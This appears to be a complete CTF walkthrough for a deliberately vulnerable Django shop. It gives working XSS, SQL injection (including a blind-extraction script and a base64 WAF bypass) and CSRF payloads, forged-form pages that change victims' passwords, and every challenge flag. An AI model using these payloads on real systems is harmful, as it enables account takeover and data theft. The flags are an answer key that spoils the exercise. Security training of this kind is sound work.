# Helmaand CTF -- Complete Walkthrough & Solutions

> **Helmaand** is an intentionally vulnerable Django e-commerce platform designed for Capture The Flag (CTF) security training. It contains **11 challenges** across three categories: **Cross-Site Scripting (XSS)**, **SQL Injection (SQLi)**, and **Cross-Site Request Forgery (CSRF)**.

---

## Table of Contents

- [Environment Setup](#-environment-setup)
- [Challenge Categories](#-challenge-categories)
- [XSS Challenges (1-3)](#-xss-challenges-13)
  - [Challenge 1: Stored XSS](#challenge-1--stored-xss)
  - [Challenge 2: Reflected XSS](#challenge-2--reflected-xss)
  - [Challenge 3: DOM-based XSS](#challenge-3--dom-based-xss)
- [SQL Injection Challenges (4-8)](#-sql-injection-challenges-48)
  - [Challenge 4: UNION-based SQLi](#challenge-4--union-based-sqli)
  - [Challenge 5: Error-based SQLi](#challenge-5--error-based-sqli)
  - [Challenge 6: Blind Boolean SQLi](#challenge-6--blind-boolean-sqli)
  - [Challenge 7: Time-based Blind SQLi](#challenge-7--time-based-blind-sqli)
  - [Challenge 8: Authentication Bypass SQLi](#challenge-8--authentication-bypass-sqli)
- [CSRF Challenges (9-11)](#-csrf-challenges-911)
  - [Challenge 9: CSRF via POST](#challenge-9--csrf-via-post-change-email)
  - [Challenge 10: CSRF via GET](#challenge-10--csrf-via-get-reset-preferences)
  - [Challenge 11: Password Change CSRF](#challenge-11--password-change-csrf)
- [Quick Reference -- All Flags](#-quick-reference--all-11-flags)

---

## Environment Setup

### Prerequisites

- Python 3.12+
- Django 6.0.7
- SQLite (included with Python)

### Installation & Run

```bash
# Clone the repository
git clone https://github.com/<your-username>/Helmaand.git
cd Helmaand

# Create and activate virtual environment
python -m venv venv
source venv/bin/activate    # Linux/macOS
# venv\Scripts\activate     # Windows

# Install dependencies
pip install -r requirements.txt

# Apply database migrations
python manage.py migrate

# Seed CTF challenge data (products, users, flags, promos)
python manage.py seed_data

# Create a superuser (optional, for admin panel access)
python manage.py createsuperuser

# Start the development server
python manage.py runserver
```

The application will be available at **http://127.0.0.1:8000/**.

### Default Credentials

| Role | Username | Password |
|------|----------|----------|
| Admin (staff) | `admin` | `admin123` |
| Regular user | `demo` | `demo123` |

### Challenge Hub

Visit **http://127.0.0.1:8000/lab/** to see the challenge dashboard listing all 11 challenges with their categories, difficulty levels, and descriptions.

---

## Challenge Categories

| # | Category | Challenges | Flag Delivery |
|---|----------|------------|---------------|
| 1 | Cross-Site Scripting (XSS) | 1-3 | Browser cookies (`ctf_xss_*`) |
| 2 | SQL Injection (SQLi) | 4-8 | Hidden DB records, error leaks, flash messages |
| 3 | Cross-Site Request Forgery (CSRF) | 9-11 | Django flash messages |

---

## XSS Challenges (1-3)

XSS challenges set a browser cookie containing the flag when you visit the vulnerable page. The goal is to execute JavaScript on the page and read `document.cookie` to retrieve it.

---

### Challenge 1: Stored XSS

| Field | Value |
|-------|-------|
| **Difficulty** | Easy |
| **Category** | XSS |
| **Vulnerability** | Stored XSS -- review comment rendered with `|safe` filter |
| **Vulnerable Code** | `shop/views.py` (sets cookie), `templates/shop/detail.html` (`{{ review.comment|safe }}`) |
| **Flag Location** | Cookie `ctf_xss_stored` |
| **Flag** | `HLMD{st0r3d_c00k13_m0nst3r}` |

#### Step-by-Step Solution

1. **Log in** to the application using `demo` / `demo123` (or any registered account).
2. Navigate to any product page, e.g. **http://127.0.0.1:8000/product/luxury-leather-jacket/**.
3. In the review form at the bottom of the page, enter the following payload in the **comment** field:
   ```
   <img src=x onerror="alert(document.cookie)">
   ```
4. Submit the review.
5. Reload the product page -- the malicious JavaScript executes automatically.
6. An alert box appears showing `document.cookie`, which contains:
   ```
   ctf_xss_stored=HLMD{st0r3d_c00k13_m0nst3r}
   ```

#### Why It Works

The `detail.html` template renders review comments using the `|safe` filter, which tells Django to **not** auto-escape HTML. Any HTML/JavaScript in the comment is rendered and executed in every visitor's browser.

> **Note:** A sample XSS review (`<script>alert('XSS demo by demo user')</script>`) is pre-seeded on the Luxury Leather Jacket product.

---

### Challenge 2: Reflected XSS

| Field | Value |
|-------|-------|
| **Difficulty** | Easy |
| **Category** | XSS |
| **Vulnerability** | Reflected XSS -- `?id=` query parameter rendered with `|safe` |
| **Vulnerable Code** | `shop/views.py` (sets cookie), `templates/shop/track_order.html` (`{{ tracking_id|safe }}`) |
| **Flag Location** | Cookie `ctf_xss_reflected` |
| **Flag** | `HLMD{r3fl3ct3d_gl4ss_sh4tt3r}` |

#### Step-by-Step Solution

1. Visit the order tracking page with a malicious payload in the `id` query parameter:
   ```
   http://127.0.0.1:8000/track/?id=<script>alert(document.cookie)</script>
   ```
2. The page renders the `id` parameter directly into the HTML without escaping.
3. The JavaScript executes immediately, showing an alert with `document.cookie`.
4. The cookie contains:
   ```
   ctf_xss_reflected=HLMD{r3fl3ct3d_gl4ss_sh4tt3r}
   ```

#### Why It Works

The `track_order.html` template takes the `tracking_id` value from the URL query string and renders it with `|safe`, allowing injected `<script>` tags to execute.

---

### Challenge 3: DOM-based XSS

| Field | Value |
|-------|-------|
| **Difficulty** | Intermediate |
| **Category** | XSS |
| **Vulnerability** | DOM-based XSS -- `location.hash` written to `innerHTML` via client-side JavaScript |
| **Vulnerable Code** | `templates/shop/gallery.html` (JS reads `location.hash` -> `el.innerHTML = hash;`) |
| **Flag Location** | Cookie `ctf_xss_dom` |
| **Flag** | `HLMD{d0m_s1nk_b0w_bre4ch}` |

#### Step-by-Step Solution

1. Visit the gallery page with a payload in the URL fragment (after `#`):
   ```
   http://127.0.0.1:8000/gallery/#<img src=x onerror="alert(document.cookie)">
   ```
2. Client-side JavaScript in `gallery.html` reads `location.hash`, strips the `#`, and assigns it directly to an element's `innerHTML`.
3. The `onerror` event fires, executing `alert(document.cookie)`.
4. The cookie contains:
   ```
   ctf_xss_dom=HLMD{d0m_s1nk_b0w_bre4ch}
   ```

#### Why It Works

Unlike stored or reflected XSS, DOM-based XSS occurs entirely on the **client side**. The server never sees the payload -- it's in the URL fragment (`#`), which is not sent to the server. The page's JavaScript reads `location.hash` and writes it to `innerHTML` without sanitization.

> **Note:** The fragment (`#...`) is not sent to the server in HTTP requests, so server-side WAFs or frameworks cannot detect this attack. The cookie is set by the view on page load.

---

## SQL Injection Challenges (4-8)

SQL Injection challenges exploit raw SQL queries built with f-string interpolation. Flags are stored in the database and extracted through various SQLi techniques.

---

### Challenge 4: UNION-based SQLi

| Field | Value |
|-------|-------|
| **Difficulty** | Intermediate |
| **Category** | SQLi |
| **Vulnerability** | UNION SELECT injection via f-string interpolation into `LIKE '%{q}%'` |
| **Vulnerable Code** | `shop/views.py` (raw f-string SQL in search view) |
| **Flag Location** | Hidden product row in `shop_product` table (`is_active=0`) |
| **Flag** | `HLMD{un10n_s3l3ct_d4t4_dr41n}` |

#### Step-by-Step Solution

1. The search page at **http://127.0.0.1:8000/search/** takes a `q` query parameter that is directly interpolated into a raw SQL query:
   ```sql
   SELECT * FROM shop_product WHERE name LIKE '%{q}%' OR description LIKE '%{q}%' AND is_active = 1
   ```
2. There is a hidden product (slug `ctf-secret-flag-product`, `is_active=0`) whose description contains the flag. The `is_active = 1` filter hides it from normal searches.
3. Craft a UNION-based payload to extract the hidden product:
   ```
   http://127.0.0.1:8000/search/?q=x' UNION SELECT id,name,slug,brand,description,price,discount_price,stock,size,color,is_active,created_at,updated_at,category_id FROM shop_product WHERE is_active=0 --
   ```
4. The page now shows the hidden "Secret Admin Item" product in the search results.
5. Its description reads:
   ```
   Congratulations! You found the hidden flag: HLMD{un10n_s3l3ct_d4t4_dr41n}
   ```

#### Why It Works

The search query uses an f-string to build raw SQL (`f"...LIKE '%{q}%'..."`), allowing the attacker to close the string with `'`, add a `UNION SELECT` to pull from another table/query, and comment out the rest with `--`.

#### Full Payload (URL-encoded)

```
/search/?q=x'%20UNION%20SELECT%20id%2Cname%2Cslug%2Cbrand%2Cdescription%2Cprice%2Cdiscount_price%2Cstock%2Csize%2Ccolor%2Cis_active%2Ccreated_at%2Cupdated_at%2Ccategory_id%20FROM%20shop_product%20WHERE%20is_active%3D0%20--
```

---

### Challenge 5: Error-based SQLi

| Field | Value |
|-------|-------|
| **Difficulty** | Intermediate |
| **Category** | SQLi |
| **Vulnerability** | `?sort=` parameter concatenated into `ORDER BY`; raw DB error reflected to the user |
| **Vulnerable Code** | `shop/views.py` (raw ORDER BY, error message in template) |
| **Flag Location** | `security_ctfflag` table, `challenge_id='sqli_error'` |
| **Flag** | `HLMD{3rr0r_l34k_sch3m4_expl0s10n}` |

#### Step-by-Step Solution

1. The category filter page at **http://127.0.0.1:8000/filter/** accepts a `sort` parameter that is concatenated into an `ORDER BY` clause.
2. Normal sort values are `name`, `price`, or `created_at` (whitelisted). Any other value triggers a raw SQL path.
3. **Step 1 -- Trigger an error to leak schema info:**
   ```
   http://127.0.0.1:8000/filter/?sort=invalidcolumn
   ```
   The page displays the raw SQLite error message, leaking table and column names.

4. **Step 2 -- Extract the flag using an error-based subquery:**
   ```
   http://127.0.0.1:8000/filter/?sort=(CASE WHEN (SELECT substr(flag,1,1) FROM security_ctfflag WHERE challenge_id='sqli_error')='H' THEN name ELSE price END)
   ```
   By iterating through each character position and comparing against possible characters, you can reconstruct the flag one character at a time based on the sort order of results.

5. The complete flag is:
   ```
   HLMD{3rr0r_l34k_sch3m4_expl0s10n}
   ```

#### Why It Works

The `sort` parameter is directly concatenated into `ORDER BY {sort}`. Invalid SQL causes a database exception, and the raw error message (`str(e)`) is rendered in the template via `{{ error_message }}`, leaking schema information. This can be combined with conditional ORDER BY subqueries to extract data character by character.

---

### Challenge 6: Blind Boolean SQLi

| Field | Value |
|-------|-------|
| **Difficulty** | Intermediate |
| **Category** | SQLi |
| **Vulnerability** | `?id=` concatenated into `WHERE id = {id}`; only "In Stock"/"Out of Stock" returned |
| **Vulnerable Code** | `shop/views.py` (raw f-string SQL in stock check) |
| **Flag Location** | `security_ctfflag` table, `challenge_id='sqli_blind'` |
| **Flag** | `HLMD{bl1nd_b00l3an_0r4cl3}` |

#### Step-by-Step Solution

1. The stock check page at **http://127.0.0.1:8000/stock/** takes an `id` parameter interpolated into:
   ```sql
   SELECT * FROM shop_product WHERE id = {id}
   ```
2. The response only reveals whether a product was found ("In Stock") or not ("Product not found"/"Out of Stock") -- no direct data output.
3. Use a **boolean-based blind** technique to extract the flag character by character:
   ```
   http://127.0.0.1:8000/stock/?id=1 AND (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_blind') --
   ```
   - If the response says "In Stock" -> the condition is **true** (first char is `H`).
   - If "Product not found" -> the condition is **false**.

4. Iterate through each position (1, 2, 3, ...) and each character (A-Z, a-z, 0-9, `{`, `}`, `_`) to reconstruct the full flag.
5. The complete flag is:
   ```
   HLMD{bl1nd_b00l3an_0r4cl3}
   ```

#### Automation Script Example

```python
import requests

BASE = "http://127.0.0.1:8000"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
flag = ""

for pos in range(1, 50):
    for c in CHARSET:
        payload = f"1 AND (SELECT substr(flag,{pos},1)='{c}' FROM security_ctfflag WHERE challenge_id='sqli_blind') -- "
        r = requests.get(f"{BASE}/stock/", params={"id": payload})
        if "In Stock" in r.text:
            flag += c
            print(f"[+] Position {pos}: {c}  ->  {flag}")
            break
    else:
        break

print(f"\n[*] Flag: {flag}")
```

#### Why It Works

Since the application only returns a boolean indicator (product exists / doesn't exist), an attacker can inject boolean conditions into the `WHERE` clause. By observing whether the product is shown ("true") or not ("false"), the attacker can extract data one bit/character at a time.

---

### Challenge 7: Time-based Blind SQLi

| Field | Value |
|-------|-------|
| **Difficulty** | Intermediate |
| **Category** | SQLi |
| **Vulnerability** | `?code=` concatenated into `WHERE code='{code}'`; only "Valid"/"Invalid" returned |
| **Vulnerable Code** | `shop/views.py` (raw f-string SQL in promo code check) |
| **Flag Location** | `security_ctfflag` table, `challenge_id='sqli_time'` |
| **Flag** | `HLMD{t1m3_w41ts_f0r_n0_0n3}` |

#### Step-by-Step Solution

1. The promo code page at **http://127.0.0.1:8000/promo/** takes a `code` parameter interpolated into:
   ```sql
   SELECT * FROM shop_promocode WHERE code = '{code}'
   ```
2. Valid promo codes (seeded): `SUMMER25`, `WELCOME10`, `VIP50`.
3. The response returns "Valid" or "Invalid" -- boolean-based extraction is possible, but time-based is also effective.

4. **Boolean path (SQLite):**
   ```
   http://127.0.0.1:8000/promo/?code=SUMMER25' OR (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_time') --
   ```
   - "Valid" -> condition is **true**.
   - "Invalid" -> condition is **false**.

5. **Time-based path (MySQL, for educational purposes):**
   ```
   http://127.0.0.1:8000/promo/?code=SUMMER25' OR IF((SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_time'),SLEEP(3),0) --
   ```
   - If the response takes ~3 seconds -> condition is **true**.
   - If the response is immediate -> condition is **false**.

6. Iterate through each character to reconstruct the flag:
   ```
   HLMD{t1m3_w41ts_f0r_n0_0n3}
   ```

#### Why It Works

The promo code is interpolated directly into raw SQL. Boolean-based extraction works because "Valid"/"Invalid" reveals the truth value of injected conditions. Time-based extraction works by injecting a conditional `SLEEP()` -- if the condition is true, the database pauses, making the response slow. This is useful when no boolean indicator is available.

---

### Challenge 8: Authentication Bypass SQLi

| Field | Value |
|-------|-------|
| **Difficulty** | Easy |
| **Category** | SQLi |
| **Vulnerability** | Username/password concatenated into raw `auth_user` query |
| **Vulnerable Code** | `shop/views.py` (raw f-string SQL, base64-decoded `_token` to bypass WAF) |
| **Flag Location** | Flash message (`messages.info`) after successful bypass |
| **Flag** | `HLMD{4uth_byp4ss_m4st3r_k3y}` |

#### Step-by-Step Solution

1. The staff login page at **http://127.0.0.1:8000/staff-login/** builds a raw SQL query:
   ```sql
   SELECT * FROM auth_user WHERE username = '{username}' AND password = '{password}' AND is_staff = 1 LIMIT 1
   ```
2. The WAF blocks SQLi patterns (`' OR 1=1`, `--`) even in raw URL query strings. To bypass the WAF, the payload must be **base64-encoded** into a single `_token` parameter.

3. **Method 1 -- Use the built-in encoder (easiest):**
   Visit **http://127.0.0.1:8000/staff-login/encode/** — it generates a WAF-safe URL with the payload already encoded. Click the link to authenticate.

4. **Method 2 -- Manual encoding:**
   Take the injection payload `admin' OR '1'='1|anything` (format: `username|password`), base64-encode it, and pass as `_token`:
   ```
   echo -n "admin' OR '1'='1|anything" | base64
   # Output: YWRtaW4nIE9SIDEgJzEnPTEgfGFueXRoaW5n
   ```
   Then open:
   ```
   http://127.0.0.1:8000/staff-login/?_token=YWRtaW4nIE9SIDEgJzEnPTEgfGFueXRoaW5n
   ```

5. The server decodes `_token` from base64, splits on `|` to get `username` and `password`, and injects them into the raw SQL query. Since `'1'='1` is always true, this returns the first staff user.

6. The application logs you in as that staff user.
7. A flash message appears on the redirect page:
   ```
   Flag: HLMD{4uth_byp4ss_m4st3r_k3y}
   ```

#### Why It Works

The staff login form accepts a base64-encoded `_token` parameter that decodes into `username|password`. The decoded values are interpolated into a raw SQL query using f-string formatting, allowing SQL injection. By base64-encoding the payload, the WAF only sees a random-looking alphanumeric string in `_token=<value>` and cannot detect the SQLi pattern. The `/staff-login/encode/` helper endpoint generates the safe URL automatically.

---

## CSRF Challenges (9-11)

CSRF challenges exploit missing CSRF token validation on state-changing operations. Flags are delivered via Django flash messages after the forged request succeeds.

> **Prerequisite for all CSRF challenges:** The victim must be **logged in** to the Helmaand application. The attacker hosts a malicious page on a different origin that submits a forged request to the vulnerable endpoint.

---

### Challenge 9: CSRF via POST (Change Email)

| Field | Value |
|-------|-------|
| **Difficulty** | Intermediate |
| **Category** | CSRF |
| **Vulnerability** | `@csrf_exempt` on state-changing POST (changes user email) |
| **Vulnerable Code** | `accounts/views.py` (`@csrf_exempt` on `change_email` view) |
| **Flag Location** | Flash message after redirect |
| **Flag** | `HLMD{f0rg3d_p0st_3m41l_h1j4ck}` |

#### Step-by-Step Solution

1. The victim must be logged in to Helmaand.
2. The attacker creates and hosts the following malicious HTML page on any external server:
   ```html
   <html>
   <body onload="document.forms[0].submit()">
     <form action="http://127.0.0.1:8000/accounts/change-email/" method="POST">
       <input type="hidden" name="email" value="hacker@evil.com">
     </form>
   </body>
   </html>
   ```
3. The victim visits the attacker's page.
4. The JavaScript auto-submits the form, sending a POST request to `/accounts/change-email/` that changes the victim's email to `hacker@evil.com`.
5. Because the view is decorated with `@csrf_exempt`, no CSRF token is required.
6. The victim is redirected to their profile page, which shows the flash message:
   ```
   Flag: HLMD{f0rg3d_p0st_3m41l_h1j4ck}
   ```

#### Why It Works

The `change_email` view is marked `@csrf_exempt`, meaning Django does not validate the CSRF token. Any website can submit a form to this endpoint and change the victim's email. The template also lacks a `{% csrf_token %}` tag.

---

### Challenge 10: CSRF via GET (Reset Preferences)

| Field | Value |
|-------|-------|
| **Difficulty** | Easy |
| **Category** | CSRF |
| **Vulnerability** | State-changing GET request (clears profile shipping fields) with no CSRF protection |
| **Vulnerable Code** | `accounts/views.py` (`reset_preferences` view handles GET) |
| **Flag Location** | Flash message after redirect |
| **Flag** | `HLMD{g3t_r3qu3st_s1l3nt_w1p3}` |

#### Step-by-Step Solution

1. The victim must be logged in to Helmaand.
2. The attacker embeds the following on any external page (no form submission needed):
   ```html
   <img src="http://127.0.0.1:8000/accounts/reset-preferences/" style="display:none">
   ```
3. When the victim loads the attacker's page, their browser automatically sends a GET request to `/accounts/reset-preferences/` (to "load the image").
4. The view clears the victim's phone, address, city, and postal_code fields.
5. The victim is redirected to their profile page showing the flash message:
   ```
   Flag: HLMD{g3t_r3qu3st_s1l3nt_w1p3}
   ```

#### Why It Works

The `reset_preferences` view performs a **state-changing operation (deleting data) via a GET request**, which violates REST principles and CSRF best practices. Browsers send GET requests automatically when loading images, so a simple `<img>` tag on any page can trigger the deletion -- no JavaScript or form submission required.

---

### Challenge 11: Password Change CSRF

| Field | Value |
|-------|-------|
| **Difficulty** | Intermediate |
| **Category** | CSRF |
| **Vulnerability** | `@csrf_exempt` on password-change POST |
| **Vulnerable Code** | `accounts/views.py` (`@csrf_exempt` on `change_password` view) |
| **Flag Location** | Flash message after redirect (`messages.info`) |
| **Flag** | `HLMD{p4ssw0rd_r3s3t_p0wn3d}` |

#### Step-by-Step Solution

1. The victim must be logged in to Helmaand.
2. The attacker creates and hosts the following malicious HTML page:
   ```html
   <html>
   <body onload="document.forms[0].submit()">
     <form action="http://127.0.0.1:8000/accounts/change-password/" method="POST">
       <input type="hidden" name="new_password" value="pwned123">
     </form>
   </body>
   </html>
   ```
3. The victim visits the attacker's page.
4. The form auto-submits, sending a POST request that changes the victim's password to `pwned123`.
5. The session is kept alive via `update_session_auth_hash()`, so the victim isn't logged out.
6. The victim is redirected to their profile page showing the flash message:
   ```
   Flag: HLMD{p4ssw0rd_r3s3t_p0wn3d}
   ```

#### Why It Works

The `change_password` view is `@csrf_exempt` and accepts a `new_password` POST parameter. Any website can submit a form that silently changes the victim's password. The use of `update_session_auth_hash()` ensures the victim's session isn't invalidated, making the attack invisible -- the victim won't notice until the attacker logs in with the new password.

---

## Quick Reference -- All 11 Flags

| # | Challenge | Category | Difficulty | Flag |
|---|-----------|----------|------------|------|
| 1 | Stored XSS | XSS | Easy | `HLMD{st0r3d_c00k13_m0nst3r}` |
| 2 | Reflected XSS | XSS | Easy | `HLMD{r3fl3ct3d_gl4ss_sh4tt3r}` |
| 3 | DOM-based XSS | XSS | Intermediate | `HLMD{d0m_s1nk_b0w_bre4ch}` |
| 4 | UNION SQLi | SQLi | Intermediate | `HLMD{un10n_s3l3ct_d4t4_dr41n}` |
| 5 | Error-based SQLi | SQLi | Intermediate | `HLMD{3rr0r_l34k_sch3m4_expl0s10n}` |
| 6 | Blind Boolean SQLi | SQLi | Intermediate | `HLMD{bl1nd_b00l3an_0r4cl3}` |
| 7 | Time-based SQLi | SQLi | Intermediate | `HLMD{t1m3_w41ts_f0r_n0_0n3}` |
| 8 | Auth Bypass SQLi | SQLi | Easy | `HLMD{4uth_byp4ss_m4st3r_k3y}` |
| 9 | CSRF via POST | CSRF | Intermediate | `HLMD{f0rg3d_p0st_3m41l_h1j4ck}` |
| 10 | CSRF via GET | CSRF | Easy | `HLMD{g3t_r3qu3st_s1l3nt_w1p3}` |
| 11 | Password Change CSRF | CSRF | Intermediate | `HLMD{p4ssw0rd_r3s3t_p0wn3d}` |

---

## Flag Delivery Mechanism Summary

| Category | Flag Delivery Method |
|----------|---------------------|
| **XSS (1-3)** | Each vulnerable view sets a browser cookie (`ctf_xss_stored`, `ctf_xss_reflected`, `ctf_xss_dom`). The flag must be exfiltrated via `document.cookie` through the XSS payload. |
| **SQLi (4)** | Flag stored in the `description` field of a hidden `shop_product` row (`is_active=0`). Extracted via UNION SELECT. |
| **SQLi (5-7)** | Flag stored in the `security_ctfflag` database table, keyed by `challenge_id` (`sqli_error`, `sqli_blind`, `sqli_time`). Extracted via error-based, blind boolean, or time-based techniques. |
| **SQLi (8)** | Flag displayed as a Django flash message (`messages.info`) after successful authentication bypass. |
| **CSRF (9-11)** | Flag displayed as a Django flash message (`messages.info` / `messages.success`) after the forged request succeeds. |

---

*Helmaand CTF -- Built for security learning and practice.*
